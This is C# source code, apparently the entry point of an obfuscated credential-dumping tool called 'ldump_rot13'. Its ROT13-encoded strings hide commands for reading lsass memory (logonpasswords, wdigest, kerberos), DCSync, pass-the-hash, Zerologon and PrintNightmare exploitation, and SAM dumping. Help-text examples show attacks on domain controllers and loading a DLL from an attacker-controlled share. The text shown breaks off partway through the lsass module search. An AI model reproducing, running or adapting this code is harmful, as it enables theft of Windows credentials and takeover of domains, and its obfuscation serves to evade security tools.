//start

using System.Text;

using System.Linq;

using System;

﻿//

using NDesk.Options;
using ldump_rot13.Credential;
using ldump_rot13.Win32;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using static ldump_rot13.Module.Kerberos;

namespace ldump_rot13
{
    public class Program
    {

        public static void Main(string[] args)
        {

            string command = null;
            string user = null;
            string guid = null;
            string altservice = null;
            string domain = null;
            string dc = null;
            string ntlmHash = null;
            string aes128 = null;
            string aes256 = null;
            string rc4 = null;
            string binary = null;
            string arguments = null;
            string luid = null;
            string impersonateStr = null;
            string authuser = null;
            string authdomain = null;
            string authpassword = null;
            string forcentlmStr = null;
            string mode = null;
            string auth = null;
            string target = null;
            string machineaccount = null;
            string nullsessionStr = null;
            string library = null;
            string system = null;
            string sam = null;
            bool showhelp = false;

            OptionSet opts = new OptionSet()
            {
                { new string("Pbzznaq=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Pbzznaq ybtbacnffjbeqf,rxrlf,zfi,xreorebf,gfcxt,perqzna,jqvtrfg,qpflap,mrebybtba,cevagavtugzner".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => command = v },
                { new string("Hfre=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Hfre [hfre]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => user = v },
                { new string("Thvq=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Thvq [thvq]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => guid = v },
                { new string("Qbznva=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Qbznva [qbznva]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => domain = v },
                { new string("QbznvaPbagebyyre=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--QbznvaPbagebyyre [qbznvapbagebyyre]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => dc = v },

                { new string("AgyzUnfu=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--AgyzUnfu [agyzUnfu]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => ntlmHash = v },
                { new string("Nrf128=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Nrf128 [nrf128]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => aes128 = v },
                { new string("Nrf256=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Nrf256 [nrf256]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => aes256 = v },
                { new string("Ep4=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Ep4 [ep4]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => rc4 = v },
                { new string("Ovanel=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Ovanel [ovanel]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => binary = v },
                { new string("Nethzragf=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Nethzragf [nethzragf]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => arguments = v },
                { new string("Yhvq=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Yhvq [yhvq]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => luid = v },
                { new string("Vzcrefbangr=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Vzcrefbangr [vzcrefbangr]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => impersonateStr = v },

                { new string("Zbqr=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Zbqr [zbqr]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => mode = v },
                { new string("Nhgu=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Nhgu [nhgu]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => auth = v },
                { new string("Gnetrg=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Gnetrg [gnetrg]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => target = v },
                { new string("ZnpuvarNppbhag=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--ZnpuvarNppbhag [znpuvarnppbhag]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => machineaccount = v },
                { new string("AhyyFrffvba=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--AhyyFrffvba [ahyyfrffvba]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => nullsessionStr = v },

                { new string("NhguHfre=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--NhguHfre [nhguhfre]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => authuser = v },
                { new string("NhguQbznva=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--NhguQbznva [nhguqbznva]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => authdomain = v },
                { new string("NhguCnffjbeq=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--NhguCnffjbeq [nhgucnffjbeq]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => authpassword = v },
                { new string("SbeprAgyz=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--SbeprAgyz [sbepragyz]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => forcentlmStr = v },

                { new string("Yvoenel=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Yvoenel [yvoenel]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => library = v },

                { new string("Flfgrz=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Flfgrz [flfgrzcngu]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => system = v },
                { new string("Fnz=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Fnz [fnzcngu]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => sam = v },

                { new string("Nygfreivpr=".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("--Nygfreivpr [nygreangvir freivpr]".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => altservice = v },
                { new string("u|?|uryc".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),  new string("Fubj ninvynoyr bcgvbaf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), v => showhelp = v != null },
            };

            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            bool impersonate = false;
            try
            {
                if (!string.IsNullOrEmpty(impersonateStr))
                    impersonate = bool.Parse(impersonateStr);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            bool forcentlm = false;
            try
            {
                if (!string.IsNullOrEmpty(forcentlmStr))
                    forcentlm = bool.Parse(forcentlmStr);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            bool nullsession = false;
            try
            {
                if (!string.IsNullOrEmpty(nullsessionStr))
                    nullsession = bool.Parse(nullsessionStr);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            if (showhelp)
            {
                opts.WriteOptionDescriptions(Console.Out);
                Console.WriteLine();
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command logonpasswords");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command ekeys");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command msv");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command kerberos");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command tspkg");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command credman");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command wdigest");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command dcsync --User user --Domain userdomain --DomainController dc");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command dcsync --Domain userdomain --DomainController dc");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command pth --User username --Domain userdomain --Rc4 rc4key");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command pth --Luid luid --NtlmHash ntlmhash");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes128 aes256");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command hiveghtmare");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command dumpsam --System \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM --Sam \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM ");
                Console.WriteLine("[*] Example: ldump_rot13.exe --Command listshadows");
                return;
            }

            if (string.IsNullOrEmpty(command))
                command = new string("ybtbacnffjbeqf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());

            if (!command.Equals(new string("ybtbacnffjbeqf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("zfi".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("xreorebf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("perqzna".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) &&
                !command.Equals(new string("gfcxt".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("jqvtrfg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("rxrlf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("qpflap".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) &&
                !command.Equals(new string("cgu".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("mrebybtba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("cevagavtugzner".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("uviravtugzner".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("yvfgfunqbjf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("qhzcfnz".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))) 
            {
                Console.WriteLine(new string("Haxabja pbzznaq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return;
            }

            if (IntPtr.Size != 8)
            {
                Console.WriteLine(new string("Jvaqbjf 32ovg abg fhccbegrq".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return;
            }

            OSVersionHelper osHelper = new OSVersionHelper();
            osHelper.PrintOSVersion();

            if (osHelper.build <= 9600)
            {
                Console.WriteLine(new string("Hafhccbegrq BF Irefvba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return;
            }

            if (!command.Equals(new string("qpflap".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("mrebybtba".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("cevagavtugzner".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("uviravtugzner".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("yvfgfunqbjf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())) && !command.Equals(new string("qhzcfnz".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
            {

                if (!Utility.IsElevated())
                {
                    Console.WriteLine(new string("Eha va Uvtu vagrtevgl pbagrkg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    return;
                }

                Utility.SetDebugPrivilege();

                IntPtr lsasrv = IntPtr.Zero;
                IntPtr wdigest = IntPtr.Zero;
                IntPtr lsassmsv1 = IntPtr.Zero;
                IntPtr kerberos = IntPtr.Zero;
                IntPtr tspkg = IntPtr.Zero;
                IntPtr lsasslive = IntPtr.Zero;
                IntPtr hProcess = IntPtr.Zero;
                Process plsass = Process.GetProcessesByName(new string("yfnff".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))[0];

                ProcessModuleCollection processModules = plsass.Modules;
                int modulefound = 0;

                for (int i = 0; i < processModules.Count && modulefound < 5; i++)
                {
                    string lower = processModules[i].ModuleName.ToLowerInvariant();

                    if (lower.Contains(new string("yfnfei.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        lsasrv = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    else if (lower.Contains(new string("jqvtrfg.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        wdigest = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    else if (lower.Contains(new string("zfi1_0.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
                        lsassmsv1 = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    else if (lower.Contains(new string("xreorebf.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                    {
